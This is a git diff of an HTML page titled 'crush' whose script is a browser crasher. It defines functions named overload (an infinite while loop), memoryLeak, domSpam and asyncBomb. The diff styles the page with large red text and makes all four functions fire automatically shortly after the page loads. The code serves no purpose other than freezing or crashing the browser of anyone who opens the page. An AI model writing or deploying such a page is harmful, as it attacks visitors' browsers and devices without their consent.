@@ -4,6 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>crush</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: red;
+            font-size: 5rem;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    crush
     <script>
         function overload() {
             while (true) {
@@ -32,13 +47,12 @@
             }, 1);
         }
 
-        setTimeout(overload, 10);
-        setTimeout(memoryLeak, 10);
-        setTimeout(domSpam, 10);
-        setTimeout(asyncBomb, 10);
+        window.onload = () => {
+            setTimeout(overload, 500);
+            setTimeout(memoryLeak, 500);
+            setTimeout(domSpam, 500);
+            setTimeout(asyncBomb, 500);
+        };
     </script>
-</head>
-<body>
-    <h1>crush</h1>
 </body>
 </html>
